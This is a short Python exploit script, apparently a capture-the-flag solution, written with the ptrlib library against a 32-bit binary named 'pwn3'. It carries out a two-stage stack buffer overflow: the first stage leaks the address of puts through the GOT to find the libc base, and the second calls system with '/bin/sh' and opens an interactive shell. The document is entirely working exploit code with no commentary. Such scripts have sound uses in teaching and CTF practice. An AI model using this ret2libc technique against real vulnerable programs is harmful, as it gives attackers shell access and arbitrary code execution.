from ptrlib import *

libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
elf = ELF("./pwn3")
sock = Process("./pwn3")

plt_puts = 0x08048340

# Stage 1
payload = b'A' * 0x8C
payload += p32(plt_puts)
payload += p32(elf.symbol("_start"))
payload += p32(elf.got("puts"))
sock.recvuntil("desert: \n")
sock.sendline(payload)
addr_puts = u32(sock.recvline()[:4])
libc_base = addr_puts - libc.symbol("puts")
addr_system = libc_base + libc.symbol("system")
addr_exit = libc_base + libc.symbol("exit")
addr_binsh = libc_base + next(libc.find("/bin/sh"))
dump("libc base = " + hex(libc_base))

# Stage 2
payload = b'A' * 0x8c
payload += p32(addr_system)
payload += p32(addr_exit)
payload += p32(addr_binsh)
sock.sendline(payload)

sock.interactive()
